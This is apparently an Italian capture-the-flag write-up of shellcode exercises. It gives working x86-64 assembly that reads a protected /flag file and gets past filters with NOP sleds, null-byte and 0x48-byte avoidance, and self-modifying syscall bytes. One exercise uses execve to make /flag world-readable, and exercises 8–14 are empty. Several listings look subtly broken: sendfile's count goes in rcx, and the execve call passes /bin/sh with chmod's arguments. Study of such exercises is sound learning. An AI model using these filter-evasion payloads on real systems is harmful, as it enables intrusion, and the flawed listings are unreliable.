# Shellcode Exercises

## Esercizio 1
Primo esercizio si basa sul chiedere di aprire il file con la syscall open (2) e successivamente mandarlo in output con la syscall sendfile (40) 
```
.intel_syntax noprefix
.global _start

_start:

    #open
    mov rax, 0x67616c662f
    push rax
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    #sendfile
    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov rcx, 0x64
    syscall

```

* nota: 0x67616c662f è "/flag" in little endian e si può ottenere aprendo ipython
```
In [1]: print("/flag".encode().hex())
2f666c6167
```
e poi fare il reverse dei byte.

## Esercizio 2
Questo esercizio dice "This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to  that! One way to evade this
is to have your shellcode start with a long set of single-byte instructions that do nothing , such as `nop`, before the actual functionality of your code begins. When control flow hits any of these instructions,  they will all harmlessly" quindi quello che si deve fare è semplicemente inserire 0x800 nop prima dell'esecuzione del nostro codice

```
.intel_syntax noprefix
.global _start

_start:
    .rept 0x800
     nop
    .endr

    #open
    mov rax, 0x67616c662f
    push rax
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    #sendfile
    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov rcx, 0x64
    syscall

```

## Esercizio 3
Il terzo esercizio dice "This challenge requires that your shellcode have no NULL bytes!"
Per fare ciò si può utilizzare l'esercizio 1 (che è uguale al primo esercizio ma senza `nop`) e analizzarlo con il comando ```objdump -M intel -d shellcode2```
e otterremo 
```
s1:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 b8 2f 66 6c 61 67    movabs rax,0x67616c662f
  401007:       00 00 00 
  40100a:       50                      push   rax
  40100b:       48 8d 3c 24             lea    rdi,[rsp]
  40100f:       48 31 f6                xor    rsi,rsi
  401012:       48 31 d2                xor    rdx,rdx
  401015:       48 c7 c0 02 00 00 00    mov    rax,0x2
  40101c:       0f 05                   syscall 
  40101e:       48 89 c6                mov    rsi,rax
  401021:       48 c7 c0 28 00 00 00    mov    rax,0x28
  401028:       48 c7 c7 01 00 00 00    mov    rdi,0x1
  40102f:       48 c7 c2 00 00 00 00    mov    rdx,0x0
  401036:       48 c7 c1 64 00 00 00    mov    rcx,0x64
  40103d:       0f 05                   syscall
```
come si può notare ci sono byte nulli sul caricamento del indirizzo della flag e sulle istruzioni di `mov`.
Basterà eliminarli caricando l'indirizzo con la tecnica [jmp-call-pop](https://epi052.gitlab.io/notes-to-self/blog/2018-07-15-jmp-call-pop/) e eliminare le mov eseguendo degli xor sui registri seguiti con degli or con i valori da assegnare
```
.intel_syntax noprefix
.global _start
_start:

    jmp pushFlag

    #open
    open:
    xor rax, rax
    pop rdi
    xor rax, rax
    or rax, 2
    xor rdx, rdx
    xor rsi, rsi
    syscall

    #sendfile
    xor rsi, rsi
    or rsi, rax
    xor rdi, rdi
    or rdi, 1
    xor rdx, rdx
    xor r10, r10
    or r10, 100
    xor rax, rax
    or rax, 40
    syscall

    xor rax, rax
    or rax, 60
    syscall

pushFlag:
    call open
    .byte 0x2f, 0x66, 0x6c, 0x61, 0x67

``` 

## Esercizio 4
Questo esercizio dice "This challenge requires that your shellcode have no H bytes!" 
Quindi il primo step è quello di trovare il byte che corrisponde ad H con ipython
```
In [1]: print("H".encode().hex())
48
```
Successivamente eseguiamo il codice dell'esercizio precedente per visualizzare dove si trova il byte 48 
```
0000000000401000 <_start>:
  401000:       eb 3c                   jmp    40103e <pushFlag>

0000000000401002 <open>:
  401002:       48 31 c0                xor    rax,rax
  401005:       5f                      pop    rdi
  401006:       48 31 c0                xor    rax,rax
  401009:       48 83 c8 02             or     rax,0x2
  40100d:       48 31 d2                xor    rdx,rdx
  401010:       48 31 f6                xor    rsi,rsi
  401013:       0f 05                   syscall 
  401015:       48 31 f6                xor    rsi,rsi
  401018:       48 09 c6                or     rsi,rax
  40101b:       48 31 ff                xor    rdi,rdi
  40101e:       48 83 cf 01             or     rdi,0x1
  401022:       48 31 d2                xor    rdx,rdx
  401025:       4d 31 d2                xor    r10,r10
  401028:       49 83 ca 64             or     r10,0x64
  40102c:       48 31 c0                xor    rax,rax
  40102f:       48 83 c8 28             or     rax,0x28
  401033:       0f 05                   syscall 
  401035:       48 31 c0                xor    rax,rax
  401038:       48 83 c8 3c             or     rax,0x3c
  40103c:       0f 05                   syscall 

000000000040103e <pushFlag>:
  40103e:       e8 bf ff ff ff          call   401002 <open>
  401043:       2f                      (bad)  
  401044:       66 6c                   data16 ins BYTE PTR es:[rdi],dx
  401046:       61                      (bad)  
  401047:       67                      addr32
```
Si può notare che il byte si trova negli `xor` e `or`, se provate a eseguire il codice dell'esercizio 1 mostrerà anche che vale per le `mov`.
Kwindi indirettamente ci sta dicendo che non possiamo usare queste istruzioni, però dal codice si nota che la funzione `pop` non ha quel byte e analogamente se si va a vedere anche la `push`. quindi basterà utilizzare pop e push per risolvere l'esercizio.

```
.intel_syntax noprefix
.global _start
_start:

    jmp pushFlag

    #open
    code:
    pop rdi
    push 2
    pop rax
    push 0
    pop rdx
    push 0
    pop rsi
    syscall

    #sendfile
    push rax
    pop rsi
    push 1
    pop rdi
    push 0
    pop rdx
    push 100
    pop r10
    push 40
    pop rax
    syscall

    push 60
    pop rax
    syscall

pushFlag:
    call code
    .byte 0x2f, 0x66, 0x6c, 0x61, 0x67
```

## Esercizio 5
Questa sfida invece fornisce questo "This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime." 
Che al primo sguardo è ostico, ma in realtà fornisce informazioni utili a risolverlo velocemente.
La syscall che usiamo noi è `0f05`, utilizzando la funzione `inc` si può incrementare il valore di un registro.
Kwindi la strategia usata è quella di eseguire 
```
inc byte ptr [rip]
.byte 0x0e, 0x05
```
Così facendo incrementerà il byte dell'istruzione successiva, passando da `0e05` a `0f05` che è la syscall di cui necessitiamo.
Il codice dunque risulterà così
```
.intel_syntax noprefix
.global _start

_start:

    jmp pushFlag

    code:

    #open
    pop rax
    mov rdi, rax
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    #sendfile
    mov rsi, rax
    mov rax, 0x28
    mov rdi, 1
    mov rdx, 0
    mov rcx, 0x64
    inc byte ptr [rip]
    .byte 0x0e, 0x05

pushFlag:
    call code
    .string "/flag"

```

## Esercizio 6
Questo esercizio utilizza la stessa problematica dello scorso esercizio, in più aggiunge un'altra problematica "Removing write permissions from first 4096 bytes of shellcode."
Che può essere semplicemente inserendo 4096 instruzioni `nop` prima dell'esecuzione del nostro codice

```
.intel_syntax noprefix
.global _start

_start:
    .fill 4096, 1, 0x90

    code:
    lea rdi, [rip + flag]
    xor rdx, rdx
    xor rsi, rsi
    mov rax, 2
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    mov rsi, rax
    mov rdi, 1
    xor rdx, rdx
    mov r10, 100
    mov rax, 40
    inc byte ptr [rip]
    .byte 0x0e, 0x05

    mov rax, 60
    inc byte ptr [rip]
    .byte 0x0e, 0x05

flag:
    .string "/flag"

```

## Esercizio 7
Eseguendo l'esercizio ci da queste indicazioni 
"This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need
to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.

This challenge is about to close stderr, which means that you will not be able to get use file descriptor 2 for output.

This challenge is about to close stdout, which means that you will not be able to get use file descriptor 1 for output.
You will see no further output, and will need to figure out an alternate way of communicating data back to yourself."
Questo vuol dire che non avremo nessun modo per trasmettere i dati in output, bisogna trovare un altro modo per arrivare alla flag,
il metodo utilizzato è quallo di utilizzare la syscall execve per eseguire dalla shell il comando `chmod 777 /flag` così poi da eseguire un semplice `cat /flag` dal terminale
```
.intel_syntax noprefix
.global _start

_start:

    lea rdi, [rip + shell]
    push 0
    lea rax, [rip + flag]
    push rax
    lea rax, [rip + permission]
    push rax
    lea rax, [rip + chmod]
    push rax
    lea rsi, [rsp]
    xor rdx, rdx
    mov rax, 59
    syscall

shell:
    .string "/bin/sh"

chmod:
    .string "/bin/chmod"

permission:
    .string "777"

flag:
    .string "/flag"

```
* note: 
1. `rdx` è stato azzerato perchè non servono le variabili d'ambiente.
2. su `rsi` inseriamo i parametri come se fosse un comando della shell `chmod 777 /flag` solamente che i parametri devono essere inseriti al contrario perchè nella stack, inoltre all'inizio dobbiamo mettere un `push 0` perchè serve a indicare il terminatore degli argomenti. Terminato di caricarli nella stack assegnamo a `rsi` il registro della stack
3. infine ad `rdi` assegnamo l'indirizzo della shell.

## Esercizio 8


## Esercizio 9


## Esercizio 10


## Esercizio 11


## Esercizio 12


## Esercizio 13


## Esercizio 14

